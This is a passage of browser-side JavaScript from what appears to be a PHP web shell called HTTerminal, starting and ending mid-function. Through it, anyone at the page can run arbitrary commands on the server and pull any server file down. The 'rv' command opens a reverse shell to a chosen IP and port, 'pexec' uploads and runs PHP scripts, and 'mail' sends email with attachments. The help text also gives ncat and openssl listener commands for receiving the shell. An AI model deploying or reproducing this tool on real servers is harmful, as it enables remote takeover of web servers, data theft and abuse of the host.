 return s.replaceAll(/&/g,'&amp;').replaceAll(/</g,'&lt;').replaceAll(/>/g,'&gt;').replaceAll(/"/g,'&quot;').replaceAll(/'/g,'&#x27;').replaceAll(/ /g,'&nbsp;').replace(/\n/g, '<br>');
}


function decodeHTMLEntities(text) {

return text.replace(/[\u00A0-\u9999<>\&]/gim,function(i){return '&#'+i.charCodeAt(0)+';';});

}



function OnFileChoose(){//Function to print name of choosen file for upload
	var x=document.getElementById('file').value;//Get choosen file name
	document.getElementById('filenamelbl').innerText=x;//Set filenamelbl("Choose file to upload" label) value to choosen file name
	clientLogTXT("File "+encodeHTML(x)+" was chosen to upload<br>");//Print choosen file name in terminal
	document.getElementById('inptxt').focus()//focus textbox after choosing file
}



function ValidateAddress(address) {//Function to validate an Ip/domain

ValidIpAddressRegex = new RegExp("^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$");//Valid ip address regex
ValidHostnameRegex = new RegExp("^(([a-zA-Z0-9]|[a-zA-Z0-9][a-zA-Z0-9\-]*[a-zA-Z0-9])\.)*([A-Za-z0-9]|[A-Za-z0-9][A-Za-z0-9\-]*[A-Za-z0-9])$");//Valid hostname regex
  if (ValidIpAddressRegex.test(address) || ValidHostnameRegex.test(address)) {//Return address/hostname is valid or not  
    return true
  }
  return false
} 



function ProgressUpload(percentage){//Function to print Upload progress in terminal
	if(!document.getElementById('terminal').contentWindow.document.getElementById("upload-progress")){//Check if upload-progress label elemet exists in terminal if not create it       //Create upload-progress label element
		clientLogTXT("<label id='upload-progress'>Upload Progress:0%<br></label>")
	}

	if(percentage==100){//If percentage is 100.delete upload-progress element by setting it's outerHTML to "Upload Progress:100%<br>" and print Operation completed
		document.getElementById('terminal').contentWindow.document.getElementById("upload-progress").outerHTML = "Upload Progress:100%<br>";
		clientLogTXT("Transferring file compeleted<br>")
	}else{//Operation is not completed,Update upload-progress label to percentage
		document.getElementById('terminal').contentWindow.document.getElementById('upload-progress').innerHTML="Upload Progress:"+percentage+"%<br>"

	}
}


function CheckIsEmailAddress(email) {//Function to check an email address is valid or not
 return /^(([^<>()\[\]\.,;:\s@\"]+(\.[^<>()\[\]\.,;:\s@\"]+)*)|(\".+\"))@(([^<>()\.,;\s@\"]+\.{0,1})+[^<>()\.,;:\s@\"]{2,})$/.test(email);//return email address is valid or not
}




function setpass(pass){
    if(pass==""){
        clientLogTXT("password cannot be empty<br>")
        return;
    }
    CheckIsPasswordStrong(pass)
    var params="r=&pass="+encodeURIComponent(pass)+"&setpass=1"
    var MessageArgs=[];
    MessageArgs[0]=pass;
    HTTPCommunicate("setpass",params,MessageArgs)
}




function ReverseShell(address,port,ssl){//Function to ask server for a reverse shell
    var params="s="+encodeURIComponent(address)+"&p="+encodeURIComponent(port)
    if(ssl){params+="&ssl="}
    HTTPCommunicate("rv",params,"");
}




function DownloadFromServer(path){//Function to ask server to download a file from a path on the server
    var MessageArgs=[];
    MessageArgs[0]=path;
    HTTPCommunicate("download",'d=' + encodeURIComponent(path),MessageArgs);
}


function Login(pass){
    var params="r=&pass="+encodeURIComponent(pass)+"&="
    HTTPCommunicate("login",params,"")
}


function Logout(){
    var params="l=";
    HTTPCommunicate("logout",params,"")
}




function SendMail(from,to,replyto,subject,messagefile,cc,bcc,attachmentfile){
    if(from=="" || to=="" || subject=="" || messagefile==""){
        clientLogTXT("Error:from address,to address,Mail subject and message file path cannot be empty<br>");
        return;
    }
    if(!CheckIsEmailAddress(from)){
        clientLogTXT("Error:from email address "+encodeHTML(from)+" is not a valid E-mail address<br>");
        return;
    }
    if(!CheckIsEmailAddress(to)){
        clientLogTXT("Error:to email address "+encodeHTML(to)+" is not a valid E-mail address<br>");
        return;
    }
    
    
    if(replyto!=""){
        if(!CheckIsEmailAddress(replyto)){
            clientLogTXT("Error:Reply-To email address "+encodeHTML(replyto)+" is not a valid E-mail address<br>");
            return;
        }
    }
    
    if(cc!=""){
        var ccArray=cc.split(",");
        ccArray=ccArray.filter(function(str){return /\S/.test(str);});//Remove WhiteSpace elements from array
        for (var n in ccArray) {
            if(!CheckIsEmailAddress(ccArray[n])){
                clientLogTXT("Error:CC email address "+encodeHTML(ccArray[n])+" is not a valid E-mail address<br>");
                return;
            }
            
        }
    }
    
    
    if(bcc!=""){
        var bccArray=bcc.split(",");
        
        bccArray=bccArray.filter(function(str){return /\S/.test(str);});//Remove WhiteSpace elements from array
        for (var n in bccArray) {
            if(!CheckIsEmailAddress(bccArray[n])){
                clientLogTXT("Error:BCC email address "+encodeHTML(bccArray[n])+" is not a valid E-mail address<br>");
                return;
            }
        }
    }
    
    var params="from="+encodeURIComponent(from)+"&to="+encodeURIComponent(to)+"&replyto="+encodeURIComponent(replyto)+"&subject="+encodeURIComponent(subject)+"&messagefile="+encodeURIComponent(messagefile)+"&cc="+encodeURIComponent(cc)+"&bcc="+encodeURIComponent(bcc)+"&attachmentfile="+encodeURIComponent(attachmentfile)
    HTTPCommunicate("sendmail",params,"");
    
}



function SendSTDIN(stdin){//Function to send stdin text to server.it can be a command
    var params='c='+encodeURIComponent(stdin);
    HTTPCommunicate("sendstdin",params,"")
}





function UploadFile(filePathOnServer){
    var formdata = new FormData();
    var file = document.getElementById("file").files[0];
    var sep="<?php echo DIRECTORY_SEPARATOR;if($OS=="windows"){echo DIRECTORY_SEPARATOR;}?>";
    if(filePathOnServer==""){
        filePathOnServer="."+sep;
    }
    
    if(filePathOnServer.substr(filePathOnServer.length - 1)!=sep){
        filePathOnServer+=sep;
    }
    
    if(!file){
        clientLogTXT('Error:No file is selected.Click on "Browse your file..." to choose your file for uploading <br>')
        return;
    }
    formdata.append("file",file);
    formdata.append("p",filePathOnServer);
	formdata.append("token",CSRF_token);
    
    var MessageArgs=[];
    MessageArgs[0]=filePathOnServer;
    MessageArgs[1]=file["name"];
    HTTPCommunicate("upload",formdata,MessageArgs)

}






function pexec(){
    var formdata = new FormData();
    var file = document.getElementById("file").files[0];
    if(!file){
        clientLogTXT('Error:No file is selected.Click on "Browse your file..." to choose your file for executing <br>')
        return;
    }
    formdata.append("file",file);
	formdata.append("token",CSRF_token);
    var MessageArgs=[];
    MessageArgs[0]=file["name"];
    HTTPCommunicate("pexec",formdata,MessageArgs)
}





function SigKill(){
    HTTPCommunicate("sigkill",'k=',"")
}





function CheckArgs(CommandArgs,QouteOrDoubleQoute,ReplaceDoubleQoutes){
    if(CommandArgs=="SyntaxError"){
        return "SyntaxError"
    }
    
    var l=CommandArgs.length
    var Si=-1;
    for (var i = 0; i < l; i++) {//Search ' in every item
        
        if(CommandArgs[i].CrossBrowserstartsWith('\'') && CommandArgs[i].CrossBrowserendsWith('\'') ){
            CommandArgs[i]=CommandArgs[i].split("\"").join("<©|")
        }
        
        
        if(CommandArgs[i].CrossBrowserstartsWith(QouteOrDoubleQoute)){
            Si=i
            if(!CommandArgs[i].CrossBrowserendsWith(QouteOrDoubleQoute)){
                
                var Ei=-1;
                for (var i2 = i; i2 < l; i2++){
                    if(CommandArgs[i2].CrossBrowserendsWith(QouteOrDoubleQoute)){Ei=i2;break;}
                    
                }
                if(Ei==-1){return "SyntaxError";break;}
                var part=CommandArgs.slice(Si,Ei+1)
                var part_size=(Ei+1-Si)
                part=part.join(" ")
                part=part.slice(1,part.length-1)
                //alert(part);
                CommandArgs[Si]=part
                CommandArgs.splice(Si+1,Ei-Si)
                l=l-(Ei-Si)
            }
            
        }
    }
    
    
    
    for (var i = 0; i < CommandArgs.length; i++) {//Clean empty items from array
        if (CommandArgs[i].trim() == "") {
            CommandArgs.splice(i,1);
            i--;
        }
    }
    
    for (var i = 0; i < CommandArgs.length; i++) {//Clean ''
        if (CommandArgs[i].CrossBrowserstartsWith(QouteOrDoubleQoute) && CommandArgs[i].CrossBrowserendsWith(QouteOrDoubleQoute)) {
            CommandArgs[i]=CommandArgs[i].slice(1,CommandArgs[i].length-1)
        }
    }
    
    
    
    if(ReplaceDoubleQoutes){
        for (var i = 0; i < CommandArgs.length; i++) {
            CommandArgs[i]=CommandArgs[i].split("<©|").join('"')
        }
        
    }
    return CommandArgs;
    
    
}




function CheckCommand(command){
    //Get first word of command string by splitting by space
    command=command.trimStartAndEnd()
    
    if(command.trim()!="" && HIST[HIST.length-1]!=command){
        HIST.push(command)//Add command to history
    }
    
    var CommandArgs=command.split(" ")
    
    
    
    var l=CommandArgs.length
    
    var CommandName=CommandArgs[0]
    var ArgsLen=CommandArgs.length
    
    if(CommandName.length>1){
        
        
        CommandName=CheckArgs(CheckArgs([CommandName],"'",false),'"',true)[0];
        
        
        
    }
    
    var argv=CheckArgs(CheckArgs(CommandArgs,"'",false),'"',true);
    
    
    
    var argc=argv.length;
    
    
    switch(CommandName){
        case "":
            SendSTDIN("\n")
            break;
            
            
        case "helpme":
		    clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            
            
            ShowHelp()
            break;
            
        case "hist":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }

            

            ShowHistory()
            break;
            
        case "clearhist":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }

			if(argc==2){
				
			    ClearHIST(argv[1])//remove the nth command from array	
				
			}else{
			
			    ClearHIST("all")// "all" to clear all items from history	
			
			}            

            
            break;
            
            
        case "clearterm":
            document.getElementById("terminal").contentWindow.document.getElementById("output").innerHTML=""
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            
           
            break;
            
            
            
        case "license":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            ShowLicense()
            break;
            
            
        case "github":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            window.open(ProjectPage,'_blank');
            break;
            
            
        case "donate":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }

            window.open("https://www.blockchain.com/btc/payment_request?address="+DonationAddress+"&message=Thanks for your donation.",'_blank');
            break;
            
            
        case "savehtml":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            
            var d = new Date();
            var datetime=d.getFullYear()+"_"+d.getDate()+"_"+d.getMonth()+"_"+d.getHours()+"_"+d.getMinutes()+"_"+d.getSeconds()
            DownLoadTextToFile("HTTerminal_"+datetime+".html","text/html",document.getElementById("terminal").contentWindow.document.documentElement.innerHTML)
            break;
            
            
        case "savetxt":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            var d = new Date();
            var datetime=d.getFullYear()+"_"+d.getDate()+"_"+d.getMonth()+"_"+d.getHours()+"_"+d.getMinutes()+"_"+d.getSeconds()
            DownLoadTextToFile("HTTerminal_"+datetime+".txt","text/plain",document.getElementById("terminal").contentWindow.document.documentElement.innerText)
            break;
            
            
        case "login":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

                
                
                
            if(argc==2){
                
                Login(argv[1])
                
            }else if(argc==1){
                
                Login("")
                
                }else{
                    clientLogTXT("Invalid arguments.login command syntax:</br>login yourpassword Login</br>blank password means it is the first time you are trying to login</br>")
                }
                
                
                break;
                
        case "logout":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            Logout()
            break;
            
        case "setpass":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){
                setpass(argv[1])
                
            }else{
                clientLogTXT("Invalid arguments.setpass command syntax:</br>setpass password  &nbsp;&nbsp;&nbsp;Set or change the password</br>")
                }
                break;
                
        case "start":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            ReverseShell("local","",false)
            break;
            
            
            
        case "upload":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){
                
                UploadFile(argv[1])
                
            }else if(argc==1){
                
                UploadFile("")
                
                }else{
                    clientLogTXT('Invalid arguments.upload command syntax:</br>upload /directory/to/upload Upload your local file to server(choose your file by clicking on "Browse your file...)"</br>blank path means current directory</br>')
                }
                break;
                
                
                
        case "pexec":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            pexec()
            break;
            
            
            
            
            
        case "download":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){
                
                DownloadFromServer(argv[1])
                
            }else{
                clientLogTXT("Invalid arguments.download command syntax:</br>download /path/to/file.txt  &nbsp;&nbsp;&nbsp;Download file from server to local computer</br>")
                }
                break;
                
                
                
                
                
                
        case "sigkill":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            SigKill()
            break;
            
            
        case "bgcolor":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){//Set Background Color
                SetColors(argv[1],"")
                
            }else{
                clientLogTXT("Current background color:"+encodeHTML(BGCOLOR)+"<br>Invalid arguments.bgcolor command syntax:</br>bgcolor color &nbsp;&nbsp;&nbsp;Set terminal background color</br>")
                }
                break;
                
                
        case "txtcolor":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){//Set Text Color
                SetColors("",argv[1])
                
            }else{
                clientLogTXT("Current text color:"+encodeHTML(TXTCOLOR)+"<br>Invalid arguments.txtcolor command syntax:</br>txtcolor color &nbsp;&nbsp;&nbsp;Set terminal text color</br>")
            }
                break;
        


        
        case "txtsize":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==2){//Set Text Size
                SetFontSize(argv[1])
                
            }else{
                clientLogTXT("Current text color:"+encodeHTML(TXTSIZE)+"<br>Invalid arguments.txtsize command syntax:</br>txtsize size &nbsp;&nbsp;&nbsp;Set Terminal text size</br>")
            }
                break;



				
		case "localhist":
	        clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
			
			if(SaveCommandsToLocalStorage=="y"){
				SaveCommandsToLocalStorage="n";
			    clientLogTXT("Saving commands to browser local storage Disabled.</br>")
			}else{
				SaveCommandsToLocalStorage="y";
				clientLogTXT("Saving commands to browser local storage Enabled.</br>")
			}
            SaveSettingsAndHist("LOCALHIST",SaveCommandsToLocalStorage);//Save mode to local storage if it is supported

		break;
				
                
        case "termreset":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            SetColors("black","white")
			SetFontSize("5vh");
            break;
            
            
        case "scr":
		    clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            if(AutoScroll==true){AutoScroll=false}else{AutoScroll=true};
            break;
			
			
        case "upd":
		    clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            if(AutoUpdate==true){AutoUpdate=false;clientLogTXT("<br>Auto-Updating Disabled.</br>");}else{AutoUpdate=true;clientLogTXT("<br>Auto-Updating Enabled.</br>");};
            break;
            
            
			
			
			
			
        case "mode":
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            ChangeShellMode();
            break;
			
			
		case "ccd":	
		    clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            
            if(argc==2){//change current directory
                CCD(argv[1])
                
            }else{
                clientLogTXT("Invalid arguments.ccd command syntax:</br>ccd /directly/ &nbsp;&nbsp;&nbsp;Chnage current directory</br>")
            }
                break;	

				
				
				
            case "cwd":
			clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            cwd();
            break;



				
            
			
        case "mail":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            


            var from=to=replyto=subject=messagefile=cc=bcc=attachmentfile="";
            var n;
            for (n=1;n< argc;n++) {
                if(argv[n]=="--from" || argv[n]=="-f"){
                    if(argv[n+1]){
                        from=argv[n+1];
                    }
                    
                }else if(argv[n]=="--to" || argv[n]=="-t"){
                    if(argv[n+1]){
                        to=argv[n+1];
                    }
                    
                }else if(argv[n]=="--replyto" || argv[n]=="-r"){
                    if(argv[n+1]){
                        replyto=argv[n+1];
                    }
                    
                }else if(argv[n]=="--subject" || argv[n]=="-s"){
                    if(argv[n+1]){
                        subject=argv[n+1];
                    }
                    
                }else if(argv[n]=="--messagefile" || argv[n]=="-m"){
                    if(argv[n+1]){
                        messagefile=argv[n+1];
                    }
                    
                }else if(argv[n]=="--cc" || argv[n]=="-c"){
                    if(argv[n+1]){
                        cc=argv[n+1];
                    }
                    
                }else if(argv[n]=="--bcc" || argv[n]=="-b"){
                    if(argv[n+1]){
                        bcc=argv[n+1];
                    }
                    
                }else if(argv[n]=="--attachmentfile" || argv[n]=="-a"){
                    if(argv[n+1]){
                        attachmentfile=argv[n+1];
                    }
                    
                }
                
            }
            SendMail(from,to,replyto,subject,messagefile,cc,bcc,attachmentfile)
            break;
            
            
            
        case "rv":
            clientLogTXT(encodeHTML(command)+"</br>")
            if(argv=="SyntaxError"){
                clientLogTXT("Syntax Error</br>")
                return;
            }
            

            if(argc==3 || argc==4){
                var address=argv[1]
                if(!ValidateAddress(address)){
                    clientLogTXT("Error:Address "+encodeHTML(address)+" is not a valid IP/Hostname</br>")
                    return;
                }
                var port=argv[2]
                if(isNaN(port)||port % 1 != 0||port<=0||65536<=port){
                    clientLogTXT("Error:port number "+encodeHTML(port)+" is not a valid port number</br>")
                    return;
                }
                
                
                
                if(argv[3]=="--ssl"){
                    ReverseShell(address,port,true)
                }else{
                    ReverseShell(address,port,false)
                    }
                    
            }else{
                clientLogTXT('Invalid arguments.rv command syntax:</br>rv IpOrHostname port   --ssl&nbsp;&nbsp;&nbsp;Connect back to the ip:port for reverse shell --ssl is optional</br>To listen if you use ssl:<br>openssl req -subj \"/CN=domain.com/O=Yourname/C=US\" -new -newkey rsa:4096 -sha256 -days 10000 -nodes -x509 -keyout ./server.key -out ./server.crt && ncat -l -p PortToListen --ssl --ssl-cert ./server.crt --ssl-key ./server.key</br>if you don\'t want to use ssl:ncat -l -p PortToListen<br>')
            }
            
            
            break;
            
            
            
            
            
        default:
            ServerCommands+=command+"\n"
            SendSTDIN(ServerCommands)
            ServerCommands=""
    }
    
    
}





function ChangeShellMode(){//Switch shell mode (proc_open/command_only)
    HTTPCommunicate("change_shell_mode",'cm=',"")
    
}




function CCD(dir){//function to change current working directly
	
    HTTPCommunicate("ccd",'ccd='+dir,"")
}



function cwd(){//function to get current working
    HTTPCommunicate("cwd",'cwd=',"")
}







function UpKey(){//Function to handle UpKey..Pressing Upkey used to load older commands in the history list
/*
What history list looks like:[TextBoxValueNow,OldestCommand,.....,NewestCommand]
:)

                    %%%%%%%%%%%%%
 ########           %           %                 ______
 #      #           %[DoNothing]%                 |    |
 # [TextBoxValueNow,OldestCommand,.....,NewestCommand] |
 #                       ^                     ^       |
 #                       |                     #       |
 #                       |_____________________#_______|
 #                                             #
 ###############################################

summery:
if index is 0 We are on TextBoxValueNow ==> store textbox value to TextBoxValueNow,Load NewestCommand value to textbox,set index to history array size-1
if index is 1 We are on OldestCommand ==> do nothing
if index is more than 1 We are on (OldestCommand,NewestCommand] ==> store textbox value in item with current index,Load older command value to textbox,set index to index-1

*/
        //HIST2 size is more that 1 means we have (an)older command(s) in histroy list.When history is empty we have just TextBoxValueNow in array and it's size is 1
	if(HIST2.length>1){

		if(HIST_index==0){//Index 0 means browsing history not started and Before browsing history,remember what is in textbox

			HIST2[0]=document.getElementById("inptxt").value//Store textbox value in TextBoxValueNow before browsing

			HIST_index=HIST2.length-1//get index of the NewestCommand in history array and set textbox value to it's value
			document.getElementById("inptxt").value=HIST2[HIST_index]
                        UpdateInputLabelByTextbox()

		}else if(HIST_index!=1){
			/*
			1<index means history index isn't index of the oldest item in the history(OldestCommand).And we will go back in array.
			index=1 means OldestCommand is now in the textbox and there is no older command than it so do nothing
			*/
			HIST2[HIST_index]=document.getElementById("inptxt").value//Store textbox value in item with current index before browsing

			HIST_index=HIST_index-1;//Go back in array
			document.getElementById("inptxt").value=HIST2[HIST_index]//set textbox value to the older command
                        UpdateInputLabelByTextbox()
		}
	}
		document.getElementById('inptxt').focus()//Focus textbox after changing it's value
}







function DownKey(){//Function to handle DownKey..Pressing DownKey used to load the newer commands in the history list
/*
What history list looks like:[TextBoxValueNow,OldestCommand,.....,NewestCommand]
:)

  %%%%%%%%%%%%%
  %           %                                   ______
  %[DoNothing]%                                   |    |
   [TextBoxValueNow,OldestCommand,.....,NewestCommand] |
      ^               #                        ^       |
      |               #                        #       |
      |_______________#________________________#_______|
                      #                        #
                      ##########################

summery:
if index is 0 We are on TextBoxValueNow ==> do nothing
if index is size-1 We are on NewestCommand ==> Store textbox value in item with current index(size-1),Load TextBoxValueNow value to textbox,set index to 0
if index is more than 1 We are on [OldestCommand,NewestCommand) ==> set textbox value to TextBoxValueNow,Load newer command value to textbox,set index to index+1
*/
	//HIST2 size is more that 1 means we have (an)older command(s) in histroy list.When history is empty we have just TextBoxValueNow in array and it's size is 1
	if(HIST2.length>1){
                //We are on NewestCommand.command newer than NewestCommand is command not executed in textbox(TextBoxValueNow).load TextBoxValueNow to textbox
		if(HIST_index==HIST2.length-1){
			HIST2[HIST_index]=document.getElementById("inptxt").value//Store textbox value in item with current index(size-1) before browsing
			HIST_index=0;//set index to 0 means we are on TextBoxValueNow
			document.getElementById("inptxt").value=HIST2[HIST_index]//Load TextBoxValueNow value to textbox
                        UpdateInputLabelByTextbox()
		}else if(HIST_index!=0){//We are on [OldestCommand,NewestCommand).load newer commands while we reach NewestCommand
			HIST2[HIST_index]=document.getElementById("inptxt").value//Store textbox value in item with current index before browsing
			HIST_index=HIST_index+1;//increase index
			document.getElementById("inptxt").value=HIST2[HIST_index]//set textbox value to the newer command
                        UpdateInputLabelByTextbox()
		}
	}
	document.getElementById('inptxt').focus()//Focus textbox after changing it's value
}






function keypress(event){//Function To handle keys pressed
    var KeyCode=event.which || event.keyCode;

	if(KeyCode==38){//KeyCode is 38,Upkey is pressed
		UpKey()
	}else if(KeyCode==40){//KeyCode is 40,DownKey is pressed
		DownKey()
	}

}


function Updator(){//Function to check new results comming from server.be called every n milisecodns
	HTTPCommunicate("update","r=","")
}





function ShowHistory(){//Function to show history list.it's similar to histroy command on Linux.used by "hist" command
	var HistoryToShow=HIST//What HIST Array looks like: [TheOldsetCommandInHistory,...,TheNewestCommandInHistory]
	if(HIST.length>1){//If history is not empty...
		var res='';//res a printable list of history commands and their number
		
		for(var h in HistoryToShow){//For every history item in history list get it's number and it's value and append to res
			res+=parseInt(h)+1+"&nbsp;&nbsp;"+HistoryToShow[h]+"</br>"//"Command number"  "Command value" NewLine
		}
                //print res as this function result
		clientLogTXT("Local commands history:</br>"+res)
		}
}









function ClearHIST(i){//Function to clear histroy of terminal.used by "clearhist" 
    if(i=="all"){
		HIST=[];//Clear HIST
		HIST2=[""];//Clear HIST2
	    SaveSettingsAndHist("HIST",HIST);//Clear HIST from local storage if it is supported
	    HIST_index=0;//Set histroy item index to 0		
    }else{
		
        if(1<=i){//remove the nth item from hist
		HIST.splice(i-1,1);
		HIST2.splice(i,1);
		SaveSettingsAndHist("HIST",HIST);//Clear HIST from local storage if it is supported
		HIST_index=0;//Set histroy item index to 0
		}

	
    }

}




function SetColors(Bgcolor,TXTColor){//Function to set terminal colors.used by "txtcolor" & "bgcolor" commands
	if(Bgcolor!=""){//If Bgcolor is not Empty set terminal background color to Bgcolor
		BGCOLOR=Bgcolor;//set current terminal background color to color was wanted
		document.getElementById("terminal").contentDocument.getElementById('terminal_back').style['background-color']=Bgcolor;//Set terminal background color
		document.getElementById("terminal").contentWindow.document.body.style.backgroundColor=Bgcolor;//Set terminal parent color to the same one for better view

		SaveSettingsAndHist("BGCOLOR",BGCOLOR);//Save terminal background color to local storage if it is supported
	}
	if(TXTColor!=""){//If TXTColor is not Empty set terminal background color to Bgcolor
		TXTCOLOR=TXTColor;//set current terminal text color to color was wanted
		document.getElementById("terminal").contentDocument.getElementById('terminal_back').style['color']=TXTCOLOR;//Set terminal text color
		
		SaveSettingsAndHist("TXTCOLOR",TXTCOLOR);//Save terminal text color to local storage if it is supported
	}
}




function SetFontSize(TxtSize){//Function to set terminal text size.used by "txtsize" command

if(TxtSize!=""){
	TXTSIZE=TxtSize;
	document.getElementById("terminal").contentDocument.getElementById('terminal_back').style['font-size']=TXTSIZE;//Set terminal text size
	SaveSettingsAndHist("TXTSIZE",TXTSIZE);//Save terminal text size to local storage if it is supported
}	
	
}





function ShowHelp(){//Function to print help message in terminal.Thanks https://wordhtml.com for converting word to html format
var HelpMsg="+-+-+-+-+-+-+-+-+-+-+\n\
|H|T|T|e|r|m|i|n|a|l|\n\
+-+-+-+-+-+-+-+-+-+-+\n\
\n\
Help:\n\
\n\
Click on \"Send\" to run a command\n\
Click on ↑ and ↓ to browse command history\n\
Click on \"Browse your file...\" to choose your file for uploading\n\
\n\
HTTerminal commands:\
helpme                      Show this help\n\
login <YourPassword>        Login\n\
logout                      Logout\n\
setpass                     Set or change the password\n\
mode                        Switch shell mode to (proc_open/command_only)\n\
 proc_open mode:start cmd.exe or shell and handle it\n\
 command_only mode:just send commands and get result,can't read stderr or run-time results\n\
 \n\
start                       Start command-line if mode is proc_open\n\
ccd /directly/              Change current directory path\n\
cwd                         Show current directry path\n\
hist                        Show All History\n\
clearhist <Optional:index>  Clear local command history\n\
 this command with no argument clear all command history\n\
 if you pass index argument,it will remove the history item having the same index\n\
 \"hist\" command prints history list items and indexes\n\
clearterm                   Clear terminal\n\
localhist                  (Enable/Disable) saving commands in the local storage\n\
 (You can disable saving commands may contain sensitive data in your browser storage for more security)\n\
upload /directory/  Upload your local file to server(choose your file by clicking on \"Browse your file...\")\n\
                            blank path means current directory\n\
\n\
download /path/to/file.txt  Download file from server to local computer\n\
                            Setting just filename means download file from current directory\n\
pexec                       Upload and execute a php script(choose your file by clicking on \"Browse your file...\")\n\
\n\
rv ip port --ssl[optional]  Connect back to the ip:port for reverse shell\n\
 for simple reverse shell:   rv ip port\n\
 to listen for it        :   ncat -l -p PortToListen\n\
\n\
 for ssl reverse shell   :   rv ip port --ssl\n\
 to creacet SSL key,\n\
 certificate and listen\n\
 for ssl connection      :   openssl req -subj \"/CN=domain.com/O=Yourname/C=US\" -new -newkey rsa:4096 -sha256 -days 10000 -nodes -x509 -keyout ./server.key -out ./server.crt && ncat -l -p PortToListen --ssl --ssl-cert ./server.crt --ssl-key ./server.key\n\
\n\
mail                        Send E-mails\n\
 --from,-f                  from email address\n\
 --to,-t                    to email address\n\
 --subject,-s               email subject\n\
 --messagefile,-m           message saved in txt or html file\n\
 Optional arguments:\n\
 --replyto,-r               reply-to email address\n\
 --cc,-c                    CC email addresses.Separate email addresses by ,\n\
 --bcc,-b                   BCC email addresses.Separate email addresses by ,\n\
 --attachmentfile,-a        path of attachment file to send\n\
\n\
savetxt                     Download Terminal output as a txt file to local computer\n\
savehtml                    Download Terminal output as a html file to local computer\n\
bgcolor <ColorNameOrCode>   Set Terminal background color and save it\n\
txtcolor <ColorNameOrCode>  Set Terminal text color and save it\n\
 color code is :colorname_rgb(r,g,b)_#HexColoe_hsl(h,s,l)_hwb(h,w,b),...\n\
 examples: \"txtcolor red\" or \"txtcolor rgb(255,0,0)\" or \"txtcolor #ff0000\" or ...\n\
 \n\
txtsize <FontSize>          Set Terminal text size and save it\n\
 you can you CSS units as FontSize\n\
 examples: \"txtsize 12\" or \"txtsize 5vh\" or ...\n\
 \n\
 if you execute txtcolor,bgcolor,txtsize commands without any arguments\n\
 you will get current text and background colors and the text size\n\
  \n\
termreset                   Reset Terminal background and text colors and text size to the default\n\
upd                         Stop/Start auto updating results from server\n\
scr                         Stop/Start auto scrolling\n\
sigkill                     kill shell or cmd.exe session\n\
license                     Show this project license\n\
github                      Open this project page on GitHub\n\
donate                      Donate bitcoin for the project\n\
\n"



         var project_link="<a href='"+ProjectPage+"' target='_blank' style='color: red'>"+ProjectPage+"</a>"
         var donation_link="<a href='"+DonationLink+"' target='_blank' style='color: red'>Donate!</a>"




